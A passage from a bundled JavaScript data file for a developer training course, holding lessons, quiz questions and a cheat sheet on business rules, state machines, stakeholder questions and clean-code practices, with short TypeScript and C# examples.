}`}},{type:"text",text:'Watch out for **two requests at once**. Both can check "seat is free", and both can book it. Only an **atomic** check keeps the rule true under load. Atomic means the check and the save happen as one step that cannot be split. Use a unique constraint, a lock, or a conditional update.'}],remember:"A rule checked in only one screen is a suggestion, not an invariant.",questions:[{id:"business.invariants.1",kind:"debug",difficulty:"medium",prompt:'Rule: "Each seat can be sold once." The code does `if (!seatTaken) Book(seat);`. Under heavy load a few seats are sold twice. What is the most likely cause?',choices:["Two requests both checked before either one saved","The database server is too slow","The user double-clicked in the same browser tab","The UI shows the wrong seat map"],answer:0,why:"This is a **race condition**: the result depends on which request runs first. Check-then-act is not atomic. A unique constraint on (ConcertId, SeatId) makes the second booking fail, whatever the timing.",remember:"Check-then-act is not safe under load."},{id:"business.invariants.2",kind:"scenario",difficulty:"medium",prompt:'The rule "a discount cannot be more than 50%" is checked only in the React form. Where can it still be broken?',choices:["Nowhere — the form validation blocks any value above 50%","Only in old browsers that do not run the React form checks","Any path that skips the form: API calls, imports, scripts","Only in automated tests that fill the form with bad data"],answer:2,why:"The form is one door. The API, CSV imports and admin scripts are other doors. Check the rule on the server or in the domain model. Keep the UI check too, for a nice user experience."},{id:"business.invariants.3",kind:"code",difficulty:"hard",prompt:'Rule: "An order’s Total always equals the sum of its lines." What is the risk in this design?',code:{lang:"csharp",text:`public class Order
{
    public List<OrderLine> Lines { get; set; } = new();
    public decimal Total { get; set; }
}

// somewhere else
order.Lines.Add(newLine);
await db.SaveChangesAsync();`},choices:["`SaveChangesAsync` will throw an exception","`decimal` is the wrong type for money","Nothing — EF Core updates Total automatically","Any code can add a line without updating Total"],answer:3,why:"Public setters and a public list let any code change the order without keeping the rule. Make the list private and add a method like `AddLine` that also updates Total (or compute Total from the lines)."},{id:"business.invariants.4",kind:"mcq",difficulty:"easy",prompt:"Which of these is an invariant?",choices:['"The home page should load in under 2 seconds"','"In a transfer, the debit always equals the credit"','"Buttons should be blue"','"We deploy on Tuesdays"'],answer:1,why:"An invariant is a rule about the data that must be true every time. The others are goals or habits, not rules the data must obey."}]},{id:"business.workflows",title:"Workflows and state machines",summary:"Draw the states. Draw the allowed moves.",minutes:4,blocks:[{type:"text",text:"Many business objects move through **states**. An order goes Draft → Placed → Paid → Shipped. Not every move is allowed. A **state machine** is the list of states plus the allowed moves between them. Drawing it catches bugs before they are written."},{type:"diagram",text:`Draft ──publish──► Published ──run──► Processing
  ▲                  │  ▲                 │
  └───unpublish──────┘  └────finished─────┘
                     │
                  archive
                     ▼
              Archived (final)`},{type:"text",text:`For each **state**, ask: which actions are allowed? Who can do them?
For each **arrow**, ask: what triggers it? What if it fails halfway?`},{type:"code",code:{lang:"ts",text:`type Status = 'Draft' | 'Published' | 'Processing' | 'Archived';

const allowed: Record<Status, Status[]> = {
  Draft:      ['Published'],
  Published:  ['Draft', 'Processing', 'Archived'],
  Processing: ['Published'],
  Archived:   [],
};

const canMove = (from: Status, to: Status) =>
  allowed[from].includes(to);`}},{type:"example",title:"Too many booleans",text:'`IsPublished`, `IsProcessing` and `IsArchived` as three booleans allow 8 combinations. What does "published + archived + processing" mean? Nobody knows.\nOne `Status` field allows only the states you defined.'},{type:"text",text:'A table of allowed moves is easy to **test** and easy to **show to the business**. "Can an archived scenario go back to draft?" is a quick question when the diagram is on the screen.'}],remember:"Draw the states and arrows. No arrow means not allowed.",questions:[{id:"business.workflows.1",kind:"code",difficulty:"easy",prompt:"Using this table, what does `canMove('Archived', 'Draft')` return?",code:{lang:"ts",text:`const allowed: Record<Status, Status[]> = {
  Draft:      ['Published'],
  Published:  ['Draft', 'Processing', 'Archived'],
  Processing: ['Published'],
  Archived:   [],
};
const canMove = (from: Status, to: Status) =>
  allowed[from].includes(to);`},choices:["true","false","It throws an error","undefined"],answer:1,why:'`Archived` has an empty list, so no move out of it is allowed. Archived is a final state. If the business wants "restore", that is a new arrow they must agree on.'},{id:"business.workflows.2",kind:"debug",difficulty:"medium",prompt:"Support finds an order with `IsPaid = true`, `IsCancelled = true` and `IsShipped = true` at the same time. What design problem allowed this?",choices:["Separate booleans allow impossible combinations","The database is missing an index on IsPaid","The app does not write enough logs","The order table has too many rows"],answer:0,why:"Three booleans give 8 combinations, and some make no sense. One `Status` field with allowed moves (for example, no cancel after ship) makes the impossible state impossible.",remember:"One status field is better than many booleans."},{id:"business.workflows.3",kind:"scenario",difficulty:"hard",prompt:'The flow is Placed → Paid → Shipped → Delivered. A new requirement: "Users can cancel an order." What should you ask?',choices:['"Should we add an `IsCancelled` boolean to the table?"','"Should the API use POST /cancel or DELETE /orders/{id}?"','"In which UI screens should the Cancel button appear?"','"From which states can you cancel, and what happens to money and stock?"'],answer:3,why:"Cancelling a Placed order is easy. Cancelling a Paid one means a refund. Cancelling a Shipped one means a return. Each arrow into Cancelled has different business effects."},{id:"business.workflows.4",kind:"scenario",difficulty:"medium",prompt:"A background job moves scenarios from Processing back to Published when it finishes. Sometimes the job crashes, and scenarios stay in Processing for days. Users cannot edit them. What business question does this raise?",choices:['"Can we restart the server every night to clear stuck jobs?"','"How long may it stay in Processing? Then retry, alert or reset?"','"Can we just delete the stuck rows from the table by hand?"','"Can we hide the Processing state so users can edit anyway?"'],answer:1,why:'Every "in progress" state needs a way out when things fail. How long is too long? What happens then? These are business choices: retry, alert someone, or move back to a safe state.',remember:'Every "in progress" state needs a timeout plan.'}]},{id:"business.asking-questions",title:"Ask stakeholders the right questions",summary:"Concrete examples, clear options, written answers.",minutes:3,blocks:[{type:"text",text:"Stakeholders (the people who own or use the feature) know the business. You know what the code needs. Good questions connect the two."},{type:"compare",left:{title:"Weak questions ⚠️",items:['"Any edge cases?"','"How should it work?"','"Is that OK?"',"Vague question → vague answer"]},right:{title:"Strong questions ✅",items:["Use a real example",'Offer options: "A or B?"',"One decision per question","Easy to answer in 10 seconds"]}},{type:"example",title:"Weak vs strong",text:`Weak: "What about cancellations?"
Strong: "A customer cancels after 1 of 3 items shipped. Do we refund everything, only the unshipped item, or nothing?"`},{type:"list",items:['**Turn vague words into numbers**: "fast" → "under 1 s for 95% of searches". "Soon" → a date. "Many" → how many?',"**Ask who decides**: each rule needs one owner. When two people disagree, say so openly.","**Write it down**: send a short summary after the meeting. People forget decisions made in a call."]},{type:"example",title:"A good summary message",text:`Decided: cancel is allowed until the order ships.
Partly shipped: refund only unshipped items.
Owner: Anna (Sales).
Open question: what about gift cards?`}],remember:'Ask concrete "A or B?" questions with real examples. Then write the answers down.',questions:[{id:"business.asking-questions.1",kind:"compare",difficulty:"easy",prompt:"Which question will get a more useful answer from the product owner?",choices:['"Are there any edge cases we should think about?"','"If a coupon expires while the user is paying, do we accept it?"'],answer:1,why:'A concrete situation with a yes/no choice is easy to answer. "Any edge cases?" usually gets "No, I think it’s fine".'},{id:"business.asking-questions.2",kind:"scenario",difficulty:"medium",prompt:'The requirement says: "Search must be fast." What do you do?',choices:['Assume "fast" means under 10 ms and build for that',"Agree on a number with the stakeholder, like p95 under 1 s","Pick the fastest search engine and stop worrying","Ignore it — every search feels fast in development"],answer:1,why:'"Fast" means different things to different people. A number gives you a clear target, and it tells you when you are done. Also agree on the data size the number applies to.',remember:"Vague word → ask for a number."},{id:"business.asking-questions.3",kind:"scenario",difficulty:"hard",prompt:`In a meeting, Sales says: "Refunds are automatic and instant."
Finance says: "Refunds over 500 € need manager approval." What do you do next?`,choices:["Build the Sales version, since it is better for customers","Build the Finance version, since money rules are always stricter","Name the conflict, ask who owns refund rules, record the answer","Quietly build both behind a setting, and let them pick later"],answer:2,why:"The two rules cannot both be true for a 600 € refund. Developers should not pick a winner. Make the conflict visible, get the owner to decide, and record it.",remember:"Conflicting rules → find the owner, do not pick a side."},{id:"business.asking-questions.4",kind:"mcq",difficulty:"medium",prompt:"In a call, the product owner answers 6 of your edge-case questions. What is the best next step?",choices:["Trust your memory and start coding while the answers are fresh","Write nothing down — the code and tests will be the documentation","Post a summary of decisions and open questions in the ticket","Ask the same questions again next week, to double-check answers"],answer:2,why:"A written summary lets the PO correct misunderstandings now. It also shows testers and future developers why the code works this way."}]}],cheatSheet:[{title:"Before you build",items:[{term:'Ask "Why?"',meaning:"A request is a solution — find the problem behind it"},{term:"Hard constraint",meaning:"Law, contract, policy → ask for the exact rule"},{term:"Success measure",meaning:'"How will we know it worked?"'},{term:"Glossary",meaning:"Term, meaning, example, owner"},{term:"Ubiquitous language",meaning:"DDD term: the same words everywhere, in meetings and in code"}]},{title:'"What if…?" checklist',items:[{term:"In progress",meaning:"It is half done / being processed right now"},{term:"At the same time",meaning:"Two users or two requests act at once"},{term:"Late",meaning:"One minute after the deadline or expiry"},{term:"Reversed",meaning:"Cancel, refund, undo after part already happened"},{term:"Money",meaning:"Rounding, negative totals, currency"},{term:"People",meaning:"User deleted, role changed, left the company"}]},{title:"Rules and states",items:[{term:"Business rule",meaning:"A decision the business owns — not the developer"},{term:"Invariant",meaning:"Must always be true — check it close to the data"},{term:"DB constraint",meaning:"Last protection: UNIQUE, CHECK, FK"},{term:"Check-then-act",meaning:"Not safe under load → atomic check or constraint"},{term:"State machine",meaning:"Status + allowed moves; no arrow = not allowed"},{term:"Too many booleans",meaning:"Many flags → impossible combinations"}]},{title:"Asking stakeholders",items:[{term:"Concrete example",meaning:"Real names, numbers and dates"},{term:'"A or B?"',meaning:"Options are faster to answer than open questions"},{term:"Vague word",meaning:'"fast", "soon", "real-time" → ask for a number'},{term:"Owner",meaning:"One person decides each rule"},{term:"Write it down",meaning:"Summary of decisions + open questions in the ticket"}]}]},w=Object.freeze(Object.defineProperty({__proto__:null,default:f},Symbol.toStringTag,{value:"Module"})),b={id:"clean-code",title:"Clean Code",emoji:"✨",tagline:"Code the next person can read and change",lessons:[{id:"clean-code.names",title:"Names that explain",summary:"A good name saves a comment and prevents a bug.",minutes:4,blocks:[{type:"text",text:`Code is read far more often than it is written. A **name** is the first thing a reader sees.
A good name says **what** a thing is and **why** it exists.`},{type:"diagram",text:`Bad name         Good name
─────────────    ──────────────────────
d                daysSinceLastLogin
list             unpaidInvoices
usrCnt           userCount
flag             isActive
timeout          timeoutMs
process()        sendWelcomeEmail()`},{type:"list",items:["**Reveal intention.** `elapsedDays` says more than `d`.","**No abbreviations.** Write `customerAddress`, not `custAddr`. Well-known ones like `id` or `url` are fine.","**No noise words.** `data`, `info`, `manager` and `helper` add length but no meaning.","**Booleans read as questions.** `isActive`, `hasStock`, `canEdit`.","**Put the unit in the name.** `timeoutMs`, `priceVnd`, `weightKg`.","**Functions are verbs, things are nouns.** `calculateTotal()`, `sendInvoice()`, `invoice`, `customer`."]},{type:"code",code:{lang:"ts",text:`// Before: what is 2? what is a?
let t = 0;
for (const x of list)
  if (x.st === 2) t += x.a;

// After: reads like a sentence
let paidTotal = 0;
for (const invoice of invoices)
  if (invoice.status === InvoiceStatus.Paid)
    paidTotal += invoice.amountVnd;`}},{type:"example",title:"A timeout bug",text:"A config file has `timeout = 30`. The developer means 30 seconds. The library reads it as 30 milliseconds. Every call to the slow bank API now fails.\nWith the name `timeoutMs = 30000`, nobody can misread it."},{type:"text",text:"If a name needs a comment, it is usually the wrong name. Rename it instead. Your IDE can rename safely across the whole project."}],remember:"If you need a comment to explain a name, change the name.",questions:[{id:"clean-code.names.1",kind:"mcq",difficulty:"easy",prompt:"Which name is best for a boolean that says whether the user may edit an order?",choices:["`editFlag`","`canEditOrder`","`orderEdit`","`checkEdit`"],answer:1,why:"A boolean name should read as a yes/no question. `if (canEditOrder)` reads like English. `editFlag` does not say what `true` means."},{id:"clean-code.names.2",kind:"debug",difficulty:"medium",prompt:"Two services read the same setting `retryDelay = 5`. One waits 5 ms between retries. The other waits 5 seconds. What is the root cause?",choices:["The name does not say the unit, so each team guessed","The value 5 is too small for any kind of retry setting","The two services are written in different languages","Retries should never wait between two attempts"],answer:0,why:"Nothing in `retryDelay` says milliseconds or seconds. Each team guessed differently. `retryDelayMs`, or a `TimeSpan` in C#, removes the guess.",remember:"Put the unit in the name or in the type."},{id:"clean-code.names.3",kind:"compare",difficulty:"medium",prompt:"A class calculates the shipping cost of an order. Which class name is best?",choices:["`ShippingDataManager`","`ShippingCostCalculator`","`ShippingInfoHelper`","`ShippingUtils`"],answer:1,why:"`Data`, `Info`, `Manager`, `Helper` and `Utils` are noise words: they fit any class. `ShippingCostCalculator` says exactly what the class does. It also makes clear what does not belong in it."},{id:"clean-code.names.4",kind:"code",difficulty:"hard",prompt:"What is the biggest problem with this code?",code:{lang:"ts",text:`const d = 86400000;
if (Date.now() - u.t > 30 * d) lock(u);`},choices:["The names `d`, `u` and `t` force the reader to guess","It is too slow, because it calls `Date.now()`","It should use a `switch` instead of an `if`","The number `30` must be written as `30.0`"],answer:0,why:"`d` is one day in milliseconds, `u` is a user, `t` is maybe the last login time. Every reader must work this out. `DAY_MS` and `user.lastLoginAt` make it obvious."}]},{id:"clean-code.functions",title:"Small functions and guard clauses",summary:"One job per function. Exit early instead of nesting.",minutes:5,blocks:[{type:"text",text:'A good function does **one job**. You can describe it in one short sentence without the word "and".'},{type:"text",text:"It also keeps **one level of abstraction**. That means all its steps are the same size. `PlaceOrder()` calls `Validate()`, `Save()` and `Notify()`. It does not also parse strings by hand."},{type:"diagram",text:`Before: arrow shape
if (order != null)
│ if (order.IsPaid)
│ │ if (InStock(order))
│ │ │ Ship(order)     ← real work, deep
│ │ else error
│ else error
else error

After: guard clauses
if (order == null) return error
if (!order.IsPaid) return error
if (!InStock(order)) return error
Ship(order)           ← real work, flat`},{type:"text",text:"A **guard clause** checks a bad case at the top and returns (or throws) at once. The main path then reads from top to bottom, with no deep nesting."},{type:"code",code:{lang:"csharp",text:`// Before
decimal GetDiscount(Customer c)
{
    decimal result = 0;
    if (c != null)
    {
        if (c.IsActive)
        {
            if (c.OrderCount > 10) result = 0.1m;
            else result = 0.05m;
        }
    }
    return result;
}

// After
decimal GetDiscount(Customer c)
{
    if (c == null) return 0;
    if (!c.IsActive) return 0;
    return c.OrderCount > 10 ? 0.1m : 0.05m;
}`}},{type:"text",text:"Too many **parameters** is another warning sign. With six arguments, callers mix up the order. Group them into one object with named fields."},{type:"code",code:{lang:"ts",text:`// Before: which true is which?
createUser("An", "an@x.vn", true, false, 3);

// After: named fields
createUser({
  name: "An",
  email: "an@x.vn",
  isAdmin: true,
  sendWelcome: false,
  teamId: 3,
});`}},{type:"example",title:"Reading a 300-line function",text:"A checkout function is 300 lines long. It checks stock, applies coupons, charges the card and sends the email. To fix a coupon bug, you read all 300 lines.\nAfter splitting, you open `ApplyCoupon()` and read 20 lines."}],remember:"One job per function. Check bad cases first and return early.",questions:[{id:"clean-code.functions.1",kind:"mcq",difficulty:"easy",prompt:"What is a **guard clause**?",choices:["A check at the top that returns or throws early","A `try/catch` block around the whole function","A comment that warns readers about a risky line","A unit test that protects a function from changes"],answer:0,why:"A guard clause handles a bad case first and leaves the function at once. The main logic then stays flat and easy to read."},{id:"clean-code.functions.2",kind:"code",difficulty:"medium",prompt:"You flatten this function with guard clauses. Which version keeps the same behaviour?",code:{lang:"csharp",text:`string Status(Order? o)
{
    if (o != null)
    {
        if (o.IsPaid) return "paid";
        return "waiting";
    }
    return "missing";
}`},choices:['`if (o == null) return "missing"; return o.IsPaid ? "paid" : "waiting";`','`if (o == null) return "waiting"; return o.IsPaid ? "paid" : "missing";`','`if (!o.IsPaid) return "waiting"; if (o == null) return "missing"; return "paid";`'],answer:0,why:'The guard must check `null` first and give the same result, "missing". The version that checks `IsPaid` first crashes on `null`. It reads a property before the null check.'},{id:"clean-code.functions.3",kind:"scenario",difficulty:"medium",prompt:"`ProcessOrder(id, qty, price, discount, isGift, note, warehouseId)` is called in 12 places. Last week someone swapped `price` and `discount` by mistake. What is the best fix?",choices:["Group the values into one `OrderRequest` object with named fields","Add a comment above the method that lists the parameter order","Ask the team to be more careful when they call this method","Sort the parameters alphabetically so they are easy to remember"],answer:0,why:"With named fields, `Price = 100` cannot be confused with `Discount = 100`. A comment or a careful team does not stop the next mix-up.",remember:"Many parameters → one object with named fields."},{id:"clean-code.functions.4",kind:"compare",difficulty:"hard",prompt:"Which design is better?\nA: `SaveUser(user)` validates, saves, sends an email and writes an audit log, all in 150 lines.\nB: `RegisterUser(user)` calls `Validate`, `Save`, `SendWelcomeEmail` and `WriteAudit`, each a small function.",choices:["A, because everything is in one place and easy to find","B, because each step has one job and a clear name","They are equal, because both do the same four steps"],answer:1,why:"B reads like a table of contents, and each step can be tested and changed alone. In A, an email change risks breaking the save. The name `SaveUser` also hides the extra work."}]},{id:"clean-code.dry-kiss-yagni",title:"DRY, KISS, YAGNI",summary:"Three simple rules, and when DRY goes too far.",minutes:5,blocks:[{type:"list",items:["**DRY** (Don't Repeat Yourself): each piece of knowledge lives in one place. You change it once, not in five files.","**KISS** (Keep It Simple): pick the simplest solution that works. Simple code has fewer places for bugs.",`**YAGNI** (You Aren't Gonna Need It): do not build features "for later". Build them when a real need arrives.`]},{type:"diagram",text:`Before: the rule is copied
┌──────────┐ ┌──────────┐ ┌──────────┐
│ Cart     │ │ Invoice  │ │ Report   │
│ x * 1.1  │ │ x * 1.1  │ │ x * 1.1  │
└──────────┘ └──────────┘ └──────────┘
 rate changes → 3 edits, 1 is forgotten

After: one source of truth
        ┌────────────────┐
        │ VatRate = 0.10 │
        └───────┬────────┘
     ┌──────────┼──────────┐
   Cart      Invoice     Report`},{type:"example",title:"A real DRY win",text:"A shop copies its VAT rate (for example 10%) into the cart, the invoice and a report. The rate changes. Two places get updated and one is forgotten. Invoices and reports now disagree."},{type:"text",text:"**When DRY hurts.** DRY is about shared **knowledge**, not about text that looks the same. Two pieces of code can match today but change for **different reasons**. Merging them ties them together."},{type:"compare",left:{title:"Real duplicate → merge",items:["Same rule, same owner","Change one → you must change the other","VAT rate, password policy, date format"]},right:{title:"Look-alike → keep apart",items:["Different rules that match by chance today","Different people ask for changes","Staff discount 10% and VIP discount 10%"]}},{type:"example",title:"Wrong DRY",text:'`Customer` and `Supplier` both check "name required, max 100 characters". A developer merges them into `ValidatePartner()`. Later, suppliers need a tax code and customers do not. The shared function fills up with `if (isSupplier)` flags.'},{type:"text",text:"The **rule of three**: the first time, just write it. The second time, notice the copy. The third time, extract it. By then you know what is really shared."},{type:"code",code:{lang:"ts",text:`// YAGNI: built "for later", used by nobody
interface ExportOptions {
  format: "csv" | "xml" | "pdf" | "yaml";
  compress?: boolean;
  encrypt?: boolean;
  pluginPath?: string;
}
// The real need today: CSV only.`}}],remember:"Merge code that changes for the same reason. Keep apart code that only looks the same.",questions:[{id:"clean-code.dry-kiss-yagni.1",kind:"mcq",difficulty:"easy",prompt:"What does **YAGNI** tell you?",choices:["Do not build a feature until there is a real need","Never repeat a single line of code in the project","Always pick the shortest code, even if it is unclear","Write the tests only after the feature is finished"],answer:0,why:"Code for an imagined future costs time now, and someone must maintain it. Often that future need never comes, or it comes in a different shape."},{id:"clean-code.dry-kiss-yagni.2",kind:"scenario",difficulty:"hard",prompt:"`CalcStaffDiscount` and `CalcVipDiscount` look the same: both return 10% of the total. HR owns the staff rule. Marketing owns the VIP rule. A teammate wants to merge them. What do you say?",choices:["Merge them, because duplicate code is always a bug","Keep them apart: they change for different reasons","Merge them, and add a flag for each future difference","Delete one and call the other one from both places"],answer:1,why:"They match by chance, not by rule. When marketing moves VIP to 15%, a merged function needs a flag or breaks the staff discount. DRY is about shared knowledge, not similar text.",remember:"Same text is not the same knowledge."},{id:"clean-code.dry-kiss-yagni.3",kind:"truefalse",difficulty:"medium",prompt:"The rule of three says: extract a shared function as soon as you see two similar blocks of code.",choices:["True","False"],answer:1,why:"The rule of three says wait for the third copy. With only two, you often guess wrong about what is really shared."},{id:"clean-code.dry-kiss-yagni.4",kind:"compare",difficulty:"medium",prompt:"You must export orders as CSV. Nobody has asked for other formats. Which plan follows KISS and YAGNI?",choices:["A plugin system that can load any export format later","A simple CSV export now; add formats when people ask","A generic export engine with settings for CSV, XML and PDF"],answer:1,why:"Today the need is CSV only. A plugin system or a generic engine adds code to test and maintain, for needs that may never come."}]},{id:"clean-code.comments",title:"Comments: why, not what",summary:"Code says what it does. Comments say why.",minutes:4,blocks:[{type:"text",text:"Good code already shows **what** it does. A comment should add what the code cannot say: **why** it is done this way."},{type:"diagram",text:`Comments
├─ Good
│  ├─ WHY: "bank rejects > 2 decimals"
│  ├─ WARNING: "not thread-safe"
│  └─ LINK: "see ticket SHOP-512"
└─ Bad
   ├─ repeats code: "add 1 to i"
   ├─ outdated: says 5, code says 10
   └─ commented-out code`},{type:"code",code:{lang:"ts",text:`// Bad: repeats the code
// loop over the orders
for (const order of orders) { /* ... */ }

// Bad: outdated, the limit is now 10
// max 5 retries
const MAX_RETRIES = 10;

// Good: explains why
// The bank API rejects more than 2 decimals.
// See ticket SHOP-512.
const amount = Math.round(raw * 100) / 100;`}},{type:"text",text:"**Commented-out code** is noise. Readers wonder if it is still needed. Delete it: Git keeps the old version."},{type:"text",text:"A **magic number** is a raw value with no name, like `900` or `3`. The reader must guess what it means. Give it a name with a **constant**."},{type:"code",code:{lang:"csharp",text:`// Before: what are 3 and 900?
if (attempts > 3) Lock(user, 900);

// After
const int MaxFailedLogins = 3;
var lockTime = TimeSpan.FromMinutes(15);

if (attempts > MaxFailedLogins)
    Lock(user, lockTime);`}},{type:"example",title:"The comment that lied",text:'A comment says "prices include VAT". Two years ago the code changed, and prices no longer include VAT. The comment stayed. A new developer trusts it and does not add VAT. Invoices go out too low.'}],remember:"Let names say what. Write comments only for why.",questions:[{id:"clean-code.comments.1",kind:"mcq",difficulty:"easy",prompt:"Which comment is the most useful?",choices:["`// loop over all the orders in the list`","`// 2 decimals only: the bank rejects more`","`// set total to the sum of the line prices`","`// call the save function after the check`"],answer:1,why:"Only that comment says **why**. The others repeat what the code already shows, and they go out of date when the code changes."},{id:"clean-code.comments.2",kind:"scenario",difficulty:"easy",prompt:'In a review you see 40 lines of commented-out code, kept "in case we need it later". What do you suggest?',choices:["Keep it, because deleting old code is always risky","Delete it, because Git history keeps the old version","Move it into a separate file called `OldCode.cs`","Add a comment that explains why it is commented out"],answer:1,why:"Dead code confuses readers and slowly goes stale. Version control already stores every old version, so nothing is lost."},{id:"clean-code.comments.3",kind:"code",difficulty:"medium",prompt:"What is the best improvement to this code?",code:{lang:"csharp",text:`if (order.Total > 5_000_000)
    RequireManagerApproval(order);`},choices:["Add a comment above it: `// check the total`","Replace `5_000_000` with a named constant","Write the number as `5000000.0` to be clear","Move the number into a local variable `x`"],answer:1,why:'A name like `ManagerApprovalLimitVnd` explains the number and gives one place to change it. The comment "check the total" only repeats the code.',remember:"Magic number → named constant."},{id:"clean-code.comments.4",kind:"truefalse",difficulty:"easy",prompt:"A comment on every line that explains **what** the line does is a sign of clean code.",choices:["True","False"],answer:1,why:'If every line needs a "what" comment, the names are probably weak. Better names make most "what" comments unnecessary.'}]},{id:"clean-code.errors",title:"Error handling that helps",summary:"Fail fast, never hide errors, say what went wrong.",minutes:5,blocks:[{type:"text",text:"**Fail fast** means: stop as soon as something is wrong, close to the cause. A late failure shows up far away, and the real cause is hard to find."},{type:"diagram",text:` Request
    │
    ▼
┌──────────────┐
│ API / form   │  the edge:
│ / file import│  check input,
└──────┬───────┘  reject bad data
       │ only valid data
       ▼
┌──────────────┐
│ Business     │  works with
│ logic        │  clean data
└──────┬───────┘
       ▼
┌──────────────┐
│ Database     │
└──────────────┘`},{type:"text",text:"The **edge** is where data enters your system: an API endpoint, a form, a file import. Check input there. Then the inner code can work with clean data."},{type:"code",code:{lang:"csharp",text:`// Bad: the error disappears
try { SaveOrder(order); }
catch (Exception) { }

// Better: log with context, then rethrow
try { SaveOrder(order); }
catch (Exception ex)
{
    logger.LogError(ex,
        "Save failed for order {OrderId}",
        order.Id);
    throw;
}`}},{type:"example",title:"The silent catch",text:"An import job has an empty `catch`. For three weeks, 2% of the rows fail to save. There is no error and no log. Finance finds the missing invoices at month end."},{type:"text",text:'A good error message says **what** failed, **which** item, and **what to do**. "Error 500" helps nobody. "Order 512: quantity must be 1 to 100, got 0" does.'},{type:"compare",left:{title:"Throw an exception",items:["Something unexpected or broken","Database down, file missing, a bug","The caller usually cannot fix it here"]},right:{title:"Return a result value",items:["A normal, expected failure","Wrong password, out of stock","The caller must handle it, so show it in the return type"]}},{type:"code",code:{lang:"ts",text:`type Result<T> =
  | { ok: true; value: T }
  | { ok: false; error: string };

function reserve(qty: number): Result<number> {
  if (qty > stock)
    return { ok: false, error: "Out of stock" };
  stock -= qty;
  return { ok: true, value: stock };
}`}}],remember:"Check input at the edge, fail fast, and never swallow an error.",questions:[{id:"clean-code.errors.1",kind:"debug",difficulty:"medium",prompt:'Customers say some orders "just vanish". The logs show no errors. You find this code. What is the cause?',code:{lang:"csharp",text:`try
{
    await SaveOrderAsync(order);
}
catch (Exception)
{
}`},choices:["The empty `catch` hides every failed save","The `await` keyword makes the save run twice","A missing `finally` block deletes the order","The `try` block makes the save too slow to finish"],answer:0,why:"The exception is caught and ignored, so nothing is logged and the caller thinks it worked. Log it with context and rethrow, or let it go up.",remember:"An empty catch turns a loud bug into a silent one."},{id:"clean-code.errors.2",kind:"scenario",difficulty:"medium",prompt:"An API receives an order with `quantity = -5`. Where should it be rejected?",choices:["At the API edge, before any business logic runs","In the database, when the insert fails later on","In the nightly report that checks for bad orders","Nowhere, because the UI already blocks it"],answer:0,why:"Validate where data enters. Anyone can skip the UI check by calling the API directly. Failing late, in the database or a report, makes the cause hard to trace."},{id:"clean-code.errors.3",kind:"compare",difficulty:"hard",prompt:"A login fails because the password is wrong. This happens many times every day. Which approach fits better?",choices:["Throw an exception and catch it in the controller","Return a result value like `{ ok: false, error }`"],answer:1,why:"A wrong password is a normal, expected outcome, not a broken system. A result value makes the caller handle it. Keep exceptions for unexpected problems."},{id:"clean-code.errors.4",kind:"mcq",difficulty:"easy",prompt:"Which error message helps the most?",choices:["`Error occurred`","`Invalid input`",'`Import row 37: email "an@" is not valid`',"`Something went wrong, please try again`"],answer:2,why:"It says which row, which value and what is wrong. The person can fix it at once. The others force someone to start debugging."}]},{id:"clean-code.smells",title:"Code smells and safe refactoring",summary:"Spot the warning signs and fix them in small steps.",minutes:5,blocks:[{type:"text",text:`A **code smell** is a sign that code may be hard to change. It is not a bug yet.
**Refactoring** means changing the structure of code without changing what it does.`},{type:"diagram",text:`Smell                Quick fix
───────────────────  ───────────────────────
Long method          Extract small methods
Duplicated code      Extract the shared rule
Primitive obsession  Make a small type
Feature envy         Move method to the data
Big class            Split by job`},{type:"list",items:["**Long method**: you must scroll to read it. It usually does several jobs.","**Duplicated code**: the same rule in many places. A fix in one place misses the others.","**Primitive obsession**: a plain `string` or `decimal` for an idea with rules. For example an email, money or a phone number.","**Feature envy**: a method uses another class's data more than its own. It probably belongs in that other class.","**Big class**: 3,000 lines and 40 fields. It does many jobs, so everyone edits it."]},{type:"code",code:{lang:"csharp",text:`// Before: any string is "an email"
void Send(string email, decimal amount,
          string currency) { /* ... */ }

// After: the type holds the rule
public record Email
{
    public string Value { get; }
    public Email(string value)
    {
        if (!value.Contains('@'))
            throw new ArgumentException(
                "Not a valid email", nameof(value));
        Value = value;
    }
}
void Send(Email to, Money amount) { /* ... */ }`}},{type:"text",text:"Refactor **safely**: keep the tests green after every small step."},{type:"diagram",text:`  ┌──────────────┐
  │ Tests green  │◄─────────┐
  └──────┬───────┘          │
         ▼                  │
  ┌──────────────┐          │
  │ One small    │          │
  │ change       │          │
  └──────┬───────┘          │
         ▼                  │ green:
  ┌──────────────┐          │ commit
  │ Run tests    ├──────────┘
  └──────┬───────┘
         │ red
         ▼
  Undo the step, try a smaller one`},{type:"text",text:'Keep **refactor commits** apart from **behaviour changes**. "Rename and extract methods" goes in one commit. "Fix discount bug" goes in another. Reviewers can then check each one quickly.'},{type:"example",title:"Big-bang refactor",text:'A developer rewrites the billing class in one 4,000-line pull request. On the way, it also "fixes" two rules. Nobody can review it properly. A rounding bug reaches production, and nobody can tell which change caused it.'}],remember:"Refactor in small steps with green tests, and never mix it with behaviour changes.",questions:[{id:"clean-code.smells.1",kind:"mcq",difficulty:"medium",prompt:"A method in `InvoicePrinter` reads `customer.Name`, `customer.Address`, `customer.TaxCode` and `customer.Country`. It uses almost nothing from `InvoicePrinter`. Which smell is this?",choices:["Feature envy","Primitive obsession","Duplicated code","Big class"],answer:0,why:"The method mostly uses the data of `Customer`. Moving it to `Customer`, for example as `FormatAddress()`, puts the behaviour next to its data."},{id:"clean-code.smells.2",kind:"scenario",difficulty:"hard",prompt:"You must fix a discount bug in a messy 600-line method. It has no tests. What is the safest order of work?",choices:["Rewrite the whole method first, then fix the bug in the new code","Add tests for current behaviour, refactor in small steps, then fix","Fix the bug and clean up everything in one commit to save time","Fix the bug, and never touch messy code that already works"],answer:1,why:"Tests first lock in today's behaviour, so you know the refactor broke nothing. Small steps and separate commits make each change easy to review and undo.",remember:"No tests? Add them before you refactor."},{id:"clean-code.smells.3",kind:"debug",difficulty:"medium",prompt:'After a "refactoring only" pull request, monthly totals are wrong. The PR has 80 changed files: renames, moved methods and a "small rounding tweak". What went wrong?',choices:["A behaviour change was hidden inside a big refactor PR","The team renamed too many methods in one month","Moving a method to another file always changes its behaviour","The tests ran too often, so they missed the rounding change"],answer:0,why:'The rounding tweak changed behaviour inside a "safe" refactor. Among 80 files, nobody noticed it. Separate commits or PRs make such changes visible.'},{id:"clean-code.smells.4",kind:"code",difficulty:"medium",prompt:"This call compiles. What is wrong, and which smell made it possible?",code:{lang:"csharp",text:`// CreateUser(string email,
//            string phone,
//            string name)
CreateUser("0901234567",
           "an@shop.vn",
